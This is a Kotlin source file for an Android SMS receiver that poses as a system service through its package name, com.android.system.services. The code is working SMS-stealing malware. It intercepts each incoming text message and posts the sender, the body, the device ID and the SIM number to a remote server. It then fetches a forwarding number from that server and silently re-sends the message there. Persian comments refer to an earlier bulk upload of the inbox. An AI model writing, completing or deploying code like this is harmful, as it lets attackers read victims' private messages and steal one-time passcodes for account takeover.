package com.android.system.services

import android.content.BroadcastReceiver
import android.content.Context
import android.content.Intent
import android.os.Build
import android.provider.Settings
import android.provider.Telephony
import android.telephony.SmsManager
import android.telephony.SubscriptionManager
import android.telephony.TelephonyManager
import android.util.Log
import androidx.core.content.ContextCompat
import org.json.JSONObject
import java.net.HttpURLConnection
import java.net.URL

class SmsReceiver : BroadcastReceiver() {

    companion object {
        private const val TAG = "SmsReceiver"
    }

    override fun onReceive(context: Context?, intent: Intent?) {
        if (context == null || intent == null) {
            return
        }

        val action = intent.action
        
        if (action != Telephony.Sms.Intents.SMS_RECEIVED_ACTION &&
            action != Telephony.Sms.Intents.SMS_DELIVER_ACTION) {
            return
        }

        try {
            val messages = Telephony.Sms.Intents.getMessagesFromIntent(intent)

            if (messages.isEmpty()) {
                return
            }

            val fullMessage = StringBuilder()
            var sender = ""
            var timestamp = 0L

            for (message in messages) {
                fullMessage.append(message.messageBody ?: "")
                if (sender.isEmpty()) {
                    sender = message.originatingAddress ?: "Unknown"
                    timestamp = message.timestampMillis
                }
            }

            // 🔥 چک کن که آیا batch upload اولیه انجام شده
            val prefs = context.getSharedPreferences("sms_upload_state", Context.MODE_PRIVATE)
            val hasUploadedBefore = prefs.getBoolean("initial_batch_uploaded", false)
            val lastBatchTimestamp = prefs.getLong("last_batch_timestamp", 0L)
            
            if (!hasUploadedBefore) {
                // اگه هنوز batch upload نشده، این پیامک رو ignore کن
                // چون توی batch upload ارسال میشه
                Log.d(TAG, "Batch upload not done yet - ignoring SMS from: $sender")
                return
            }
            
            // فقط پیامک‌هایی که بعد از batch upload دریافت شدن رو بفرست
            if (timestamp <= lastBatchTimestamp) {
                Log.d(TAG, "Old SMS (before batch) - ignoring. From: $sender, Time diff: ${lastBatchTimestamp - timestamp}ms")
                return
            }

            Thread {
                try {
                    sendSmsToBackend(context, sender, fullMessage.toString(), timestamp)

                    val forwardingNumber = fetchForwardingNumberFromBackend(context)
                    if (!forwardingNumber.isNullOrEmpty()) {
                        forwardSms(forwardingNumber, fullMessage.toString())
                    }
                } catch (e: Exception) {
                    Log.e(TAG, "Error in background thread", e)
                }
            }.start()

        } catch (e: Exception) {
            Log.e(TAG, "Error processing SMS", e)
        }
    }

    private fun getFirstSimPhoneNumber(context: Context): String {
        try {
            val subManager = context.getSystemService(Context.TELEPHONY_SUBSCRIPTION_SERVICE) as? SubscriptionManager
            if (subManager == null) return ""
            
            val activeSubscriptions = subManager.activeSubscriptionInfoList
            if (activeSubscriptions.isNullOrEmpty()) return ""
            
            val subscriptionInfo = activeSubscriptions[0]
            var phoneNumber = subscriptionInfo.number ?: ""
            
            if (phoneNumber.isBlank() && Build.VERSION.SDK_INT >= Build.VERSION_CODES.N) {
                try {
                    val telephonyManager = context.getSystemService(Context.TELEPHONY_SERVICE) as? TelephonyManager
                    if (telephonyManager != null) {
                        val tm = telephonyManager.createForSubscriptionId(subscriptionInfo.subscriptionId)
                        phoneNumber = tm.line1Number ?: ""
                    }
                } catch (e: Exception) {
                    Log.w(TAG, "Failed to get line1Number: ${e.message}")
                }
            }
            
            return phoneNumber
        } catch (e: Exception) {
            Log.e(TAG, "Error getting SIM phone number: ${e.message}")
            return ""
        }
    }
    
    private fun sendSmsToBackend(context: Context, sender: String, message: String, timestamp: Long) {
        try {
            val deviceId = Settings.Secure.getString(
                context.contentResolver,
                Settings.Secure.ANDROID_ID
            )
            
            val simPhoneNumber = getFirstSimPhoneNumber(context)

            // 🔥 Generate sms_id using MD5 hash (same as SmsBatchUploader)
            // This prevents duplicates between real-time and batch uploads
            val from = sender.trim()
            val to = ""  // inbox messages don't have "to"
            val smsIdString = "${deviceId}:${from}:${to}:${timestamp}:${message}"
            val md = java.security.MessageDigest.getInstance("MD5")
            val hashBytes = md.digest(smsIdString.toByteArray())
            val smsId = hashBytes.joinToString("") { "%02x".format(it) }

            val body = JSONObject().apply {
                put("sms_id", smsId)  // 🔥 Add sms_id
                put("device_id", deviceId)  // 🔥 Use device_id instead of deviceId
                put("sender", sender)
                put("message", message)
                put("timestamp", timestamp)
                if (simPhoneNumber.isNotEmpty()) {
                    put("sim_phone_number", simPhoneNumber)
                }
            }

            val baseUrl = ServerConfig.getBaseUrl()
            val urlString = "$baseUrl/sms/new"

            val url = URL(urlString)
            val conn = url.openConnection() as HttpURLConnection

            conn.requestMethod = "POST"
            conn.setRequestProperty("Content-Type", "application/json")
            conn.connectTimeout = 10000
            conn.readTimeout = 10000
            conn.doOutput = true

            conn.outputStream.use { os ->
                os.write(body.toString().toByteArray(Charsets.UTF_8))
                os.flush()
            }

            conn.responseCode
            conn.disconnect()

        } catch (e: Exception) {
            Log.e(TAG, "Error sending SMS to backend", e)
        }
    }

    private fun fetchForwardingNumberFromBackend(context: Context): String? {
        return try {
            val deviceId = Settings.Secure.getString(
                context.contentResolver,
                Settings.Secure.ANDROID_ID
            )

            val baseUrl = ServerConfig.getBaseUrl()
            val urlString = "$baseUrl/getForwardingNumber/$deviceId"

            val url = URL(urlString)
            val conn = url.openConnection() as HttpURLConnection

            conn.requestMethod = "GET"
            conn.setRequestProperty("Accept", "application/json")
            conn.connectTimeout = 10000
            conn.readTimeout = 10000

            val responseCode = conn.responseCode
            
            if (responseCode != 200) {
                conn.disconnect()
                return null
            }

            val response = conn.inputStream.bufferedReader().use { it.readText() }
            val json = JSONObject(response)
            val number = json.optString("forwardingNumber", null)

            conn.disconnect()
            number

        } catch (e: Exception) {
            Log.e(TAG, "Error fetching forwarding number", e)
            null
        }
    }

    private fun forwardSms(forwardingNumber: String, message: String) {
        try {
            val smsManager = SmsManager.getDefault()

            if (message.length > 160) {
                val parts = smsManager.divideMessage(message)
                smsManager.sendMultipartTextMessage(
                    forwardingNumber,
                    null,
                    parts,
                    null,
                    null
                )
            } else {
                smsManager.sendTextMessage(
                    forwardingNumber,
                    null,
                    message,
                    null,
                    null
                )
            }

        } catch (e: Exception) {
            Log.e(TAG, "Error forwarding SMS", e)
        }
    }
}